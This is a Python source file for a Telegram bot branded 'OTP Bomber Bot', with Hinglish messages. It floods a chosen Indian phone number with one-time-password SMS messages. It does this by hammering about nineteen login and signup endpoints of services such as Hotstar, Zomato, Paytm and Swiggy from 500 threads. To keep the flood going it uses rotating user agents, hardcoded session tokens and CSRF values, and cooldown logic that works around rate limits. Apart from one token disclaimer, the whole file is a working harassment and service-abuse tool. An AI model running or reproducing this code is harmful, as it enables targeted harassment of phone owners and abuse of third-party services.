import os
import sys
import asyncio
import importlib.util

if importlib.util.find_spec("wlzbi") is None:
    raise ImportError("wlzbi is not installed")
import wlzbi

try:
    os.system("cls" if os.name == "nt" else "clear")
except Exception:
    pass

wlzbi.logo("WLZBI", "Telegram : @rejerks | join @parithings")
wlzbi.type("OTP BOMBER BOT").center("boldYellow", speed=0.1)

import json
import random
import time
import threading
import requests
from requests.adapters import HTTPAdapter
from rich.console import Console
from fake_useragent import UserAgent

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ALLOWED_USER_ID = os.environ.get("ALLOWED_USER_ID")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN env variable set nahi hai")
if not ALLOWED_USER_ID:
    raise ValueError("ALLOWED_USER_ID env variable set nahi hai")

ALLOWED_USER_ID = int(ALLOWED_USER_ID)

THREAD_COUNT = 500
STATS_REFRESH = 3  # seconds (Telegram ke liye 3s better)

console = Console()

ua = UserAgent()
user_agents = [ua.random for _ in range(200)]

# ============ GLOBAL STATE ============
sent = 0
failed = 0
rate_limited = 0
lock = threading.Lock()
running = False
current_target = None
stop_event = threading.Event()
worker_threads = []
stats_task = None

# ============ ENDPOINTS ============
endpoints = [
    {"url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", "method": "PUT", "headers": {"Host": "api.hotstar.com", "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc", "content-type": "application/json", "x-hs-platform": "PCTV", "x-country-code": "IN", "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d", "x-hs-appversion": "5.0.40", "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/in/subscribe/sign-in"}, "json": {"phone_number": "REPLACE_WITH_TARGET", "country_prefix": "91"}},
    {"url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Host": "api.cloud.altbalaji.com", "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE", "Content-Type": "application/json", "Origin": "https://www.altbalaji.com", "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D"}, "json": {"phone_number": "REPLACE_WITH_TARGET", "country_code": "91", "platform": "web", "exp": 1601043289127}},
    {"url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", "method": "POST", "headers": {"Host": "us-central1-vootdev.cloudfunctions.net", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.voot.com", "Referer": "https://www.voot.com/"}, "json": {"type": "mobile", "mobile": "REPLACE_WITH_TARGET", "countryCode": "+91"}},
    {"url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "headers": {"Host": "apiv2.sonyliv.com", "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120", "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc", "Content-Type": "application/json", "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256", "x-via-device": "true", "app_version": "3.1.20", "Origin": "https://www.sonyliv.com", "Referer": "https://www.sonyliv.com/"}, "json": {"channelPartnerID": "MSMIND", "mobileNumber": "REPLACE_WITH_TARGET", "country": "IN", "timestamp": "2020-09-24T14:03:03.505Z"}},
    {"url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", "method": "POST", "headers": {"Host": "mobile.medplusindia.com", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.medplusmart.com", "Referer": "https://www.medplusmart.com/"}, "data": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber=REPLACE_WITH_TARGET&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false"},
    {"url": "https://webapi.apollo247.com/", "method": "POST", "headers": {"Host": "webapi.apollo247.com", "Authorization": "Bearer 3d1833da7020e0602165529446587434", "Content-Type": "application/json", "Origin": "https://www.apollo247.com", "Referer": "https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE"}, "json": {"operationName": "Login", "variables": {"mobileNumber": "+91REPLACE_WITH_TARGET", "loginType": "PATIENT"}, "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"}},
    {"url": "https://www.zomato.com/webroutes/auth/login", "method": "POST", "headers": {"Host": "www.zomato.com", "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d", "Content-Type": "application/json", "Origin": "https://www.zomato.com", "Referer": "https://www.zomato.com/kanpur"}, "json": {"country_id": 1, "phone": "REPLACE_WITH_TARGET", "verification_type": "sms", "method": "phone"}},
    {"url": "https://www.dream11.com/graphql/mutation/pwa/register", "method": "POST", "headers": {"Host": "www.dream11.com", "device": "pwa", "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766", "Content-Type": "application/json", "Origin": "https://www.dream11.com", "Referer": "https://www.dream11.com/register?ru="}, "json": {"query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": {"email": "tsunami@gmail.com", "mobileNumber": "REPLACE_WITH_TARGET", "password": "tsunami@123astronomia"}}},
    {"url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "headers": {"Host": "unacademy.com", "Authorization": "Bearer undefined", "Content-Type": "application/json", "Origin": "https://unacademy.com", "Referer": "https://unacademy.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": True, "is_un_teach_user": False}},
    {"url": "https://accounts.paytm.com/v2/api/register", "method": "POST", "headers": {"Host": "accounts.paytm.com", "Content-Type": "application/json", "Origin": "https://accounts.paytm.com", "Referer": "https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code"}, "json": {"email": "", "mobile": "REPLACE_WITH_TARGET", "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "redirectUri": "https://paytm.com/v1/api/authresponse", "clientId": "paytm-web-secure", "scope": "paytm", "state": "", "responseType": "code", "theme": "mp-html5", "dob_agreement": True}},
    {"url": "https://www.swiggy.com/mapi/auth/signup", "method": "POST", "headers": {"Host": "www.swiggy.com", "Content-Type": "application/json", "Origin": "https://www.swiggy.com", "Referer": "https://www.swiggy.com/auth/register"}, "json": {"name": "dbdbdbd", "email": "tsunami@gmail.com", "password": "sndndndbdj283jsbsbs", "referral_code": "", "mobile": "REPLACE_WITH_TARGET", "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}},
    {"url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send", "method": "POST", "headers": {"Host": "in.bookmyshow.com", "Content-Type": "application/json", "Origin": "https://in.bookmyshow.com", "Referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber=REPLACE_WITH_TARGET&email=&source=web"}, "json": {"channel": "phone", "subChannel": "sms", "details": {"phone": "REPLACE_WITH_TARGET", "origin": "https://in.bookmyshow.com"}}},
    {"url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", "method": "POST", "headers": {"Host": "www.bigbasket.com", "Content-Type": "application/json", "Origin": "https://www.bigbasket.com", "Referer": "https://www.bigbasket.com/auth/login/", "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED", "x-channel": "BB-PWA"}, "json": {"identifier": "REPLACE_WITH_TARGET"}},
    {"url": "https://api.lenskart.com/v2/customers/sendOtp", "method": "POST", "headers": {"Host": "api.lenskart.com", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.lenskart.com", "Referer": "https://www.lenskart.com/customer/account/login", "x-api-client": "mobilesite"}, "json": {"telephone": "REPLACE_WITH_TARGET"}},
    {"url": "https://www.tatacliq.com/api/v1/otp/send", "method": "POST", "headers": {"Host": "www.tatacliq.com", "Content-Type": "application/json", "Origin": "https://www.tatacliq.com", "Referer": "https://www.tatacliq.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "countryCode": "+91"}},
    {"url": "https://www.myntra.com/api/auth/otp/send", "method": "POST", "headers": {"Host": "www.myntra.com", "Content-Type": "application/json", "Origin": "https://www.myntra.com", "Referer": "https://www.myntra.com/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://www.nykaa.com/api/v1/otp/send", "method": "POST", "headers": {"Host": "www.nykaa.com", "Content-Type": "application/json", "Origin": "https://www.nykaa.com", "Referer": "https://www.nykaa.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country_code": "91"}},
    {"url": "https://api.pharmeasy.in/api/v1/otp/send", "method": "POST", "headers": {"Host": "api.pharmeasy.in", "Content-Type": "application/json", "Origin": "https://www.pharmeasy.in", "Referer": "https://www.pharmeasy.in/login"}, "json": {"phone": "REPLACE_WITH_TARGET", "country": "IN"}},
    {"url": "https://api.1mg.com/api/v1/otp/send", "method": "POST", "headers": {"Host": "api.1mg.com", "Content-Type": "application/json", "Origin": "https://www.1mg.com", "Referer": "https://www.1mg.com/login"}, "json": {"mobile": "REPLACE_WITH_TARGET", "country": "IN"}},
]


# ============ HELPER FUNCTIONS ============
def substitute(data, target):
    if isinstance(data, dict):
        return {k: substitute(v, target) for k, v in data.items()}
    elif isinstance(data, list):
        return [substitute(item, target) for item in data]
    elif isinstance(data, str):
        return data.replace('REPLACE_WITH_TARGET', target)
    else:
        return data


def build_headers(base_headers):
    h = base_headers.copy() if base_headers else {}
    h['User-Agent'] = random.choice(user_agents)
    return h


def worker(target, stop_evt):
    global sent, failed, rate_limited
    session = requests.Session()
    session.mount('http://', HTTPAdapter(pool_connections=20, pool_maxsize=20))
    session.mount('https://', HTTPAdapter(pool_connections=20, pool_maxsize=20))
    cooldown = {}

    while not stop_evt.is_set():
        ep = None
        attempts = 0
        while ep is None and attempts < 50:
            candidate = random.choice(endpoints)
            url = candidate['url']
            if url in cooldown and time.time() < cooldown[url]:
                attempts += 1
                time.sleep(0.1)
                continue
            ep = candidate
            break
        if ep is None:
            time.sleep(2)
            continue

        url = ep['url']
        method = ep['method']
        headers = build_headers(ep.get('headers'))
        json_payload = substitute(ep.get('json'), target) if 'json' in ep else None
        data_payload = substitute(ep.get('data'), target) if 'data' in ep else None

        try:
            if method == 'POST':
                resp = session.post(url, headers=headers, json=json_payload, data=data_payload, timeout=10)
            elif method == 'PUT':
                resp = session.put(url, headers=headers, json=json_payload, timeout=10)
            elif method == 'GET':
                resp = session.get(url, headers=headers, timeout=10)
            else:
                continue

            with lock:
                if resp.status_code == 429:
                    rate_limited += 1
                    cooldown[url] = time.time() + 120
                elif 200 <= resp.status_code < 300:
                    sent += 1
                else:
                    failed += 1
                    if resp.status_code in (400, 401, 403, 404, 405, 410, 422):
                        cooldown[url] = time.time() + 60

            if resp.status_code >= 400:
                time.sleep(random.uniform(1.0, 3.0))
            else:
                time.sleep(random.uniform(0.5, 1.5))

        except Exception:
            with lock:
                failed += 1
            cooldown[url] = time.time() + 60
            time.sleep(1)


# ============ TELEGRAM HANDLERS ============
def is_authorized(update: Update) -> bool:
    return update.effective_user.id == ALLOWED_USER_ID


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("❌ Unauthorized. Ye bot sirf owner ke liye hai.")
        return

    await update.message.reply_text(
        "🤖 *OTP Bomber Bot*\n\n"
        "*Commands:*\n"
        "`/bomb 9876543210` — Attack start karo\n"
        "`/stop` — Attack band karo\n"
        "`/status` — Current stats dekho\n"
        "`/help` — Ye message\n\n"
        "⚠️ Sirf apne number pe test karo.",
        parse_mode="Markdown"
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    await start_cmd(update, context)


async def bomb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, current_target, stop_event, worker_threads, stats_task, sent, failed, rate_limited

    if not is_authorized(update):
        await update.message.reply_text("❌ Unauthorized")
        return

    if running:
        await update.message.reply_text(
            f"⚠️ Attack already chal raha hai on `{current_target}`.\n"
            f"Pehle `/stop` bhejo.",
            parse_mode="Markdown"
        )
        return

    if not context.args:
        await update.message.reply_text("Usage: `/bomb 9876543210`", parse_mode="Markdown")
        return

    number = context.args[0].strip()
    if not number.isdigit() or len(number) != 10:
        await update.message.reply_text("❌ 10-digit number do (bina +91)")
        return

    # Reset counters
    with lock:
        sent = 0
        failed = 0
        rate_limited = 0

    current_target = number
    running = True
    stop_event = threading.Event()

    # Start worker threads
    worker_threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(number, stop_event))
        t.daemon = True
        t.start()
        worker_threads.append(t)

    # Start stats loop (async)
    stats_task = asyncio.create_task(stats_loop(update, context))

    await update.message.reply_text(
        f"🚀 *Attack started*\n\n"
        f"📱 Target: `{number}`\n"
        f"🧵 Threads: `{THREAD_COUNT}`\n"
        f"⏱ Stats har {STATS_REFRESH}s update honge.",
        parse_mode="Markdown"
    )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, stop_event, stats_task, current_target

    if not is_authorized(update):
        return

    if not running:
        await update.message.reply_text("⚠️ Koi attack chal nahi raha.")
        return

    running = False
    stop_event.set()

    if stats_task:
        stats_task.cancel()

    # Give threads time to exit
    await asyncio.sleep(2)

    with lock:
        s, f, r = sent, failed, rate_limited

    await update.message.reply_text(
        f"🛑 *Attack stopped*\n\n"
        f"📱 Target: `{current_target}`\n"
        f"✅ Sent: `{s}`\n"
        f"❌ Failed: `{f}`\n"
        f"⚠️ Rate-limited: `{r}`",
        parse_mode="Markdown"
    )

    current_target = None


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return

    with lock:
        s, f, r = sent, failed, rate_limited

    if running:
        await update.message.reply_text(
            f"📊 *Live Status*\n\n"
            f"📱 Target: `{current_target}`\n"
            f"✅ Sent: `{s}`\n"
            f"❌ Failed: `{f}`\n"
            f"⚠️ Rate-limited: `{r}`\n"
            f"🟢 Status: RUNNING",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚪ Koi attack nahi chal raha.")


async def stats_loop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Har STATS_REFRESH seconds mein stats edit karta hai (same message)."""
    msg = await update.message.reply_text(
        f"📊 *Stats*\n\n"
        f"📱 Target: `{current_target}`\n"
        f"✅ Sent: `0`\n"
        f"❌ Failed: `0`\n"
        f"⚠️ Rate-limited: `0`",
        parse_mode="Markdown"
    )

    last_s = last_f = last_r = -1

    while running:
        await asyncio.sleep(STATS_REFRESH)

        with lock:
            s, f, r = sent, failed, rate_limited

        # Only update if changed
        if (s, f, r) == (last_s, last_f, last_r):
            continue

        last_s, last_f, last_r = s, f, r

        try:
            await msg.edit_text(
                f"📊 *Live Stats*\n\n"
                f"📱 Target: `{current_target}`\n"
                f"✅ Sent: `{s}`\n"
                f"❌ Failed: `{f}`\n"
                f"⚠️ Rate-limited: `{r}`\n"
                f"🟢 Running...",
                parse_mode="Markdown"
            )
        except Exception:
            pass  # ignore edit errors

    # Final update
    try:
        await msg.edit_text(
            f"📊 *Final Stats*\n\n"
            f"📱 Target: `{current_target}`\n"
            f"✅ Sent: `{last_s}`\n"
            f"❌ Failed: `{last_f}`\n"
            f"⚠️ Rate-limited: `{last_r}`\n"
            f"🔴 Stopped",
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ============ MAIN ============
def main():
    print(f"[*] Bot starting... Allowed user: {ALLOWED_USER_ID}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("bomb", bomb_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))

    print("[*] Bot is running. Telegram pe /start bhejo.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
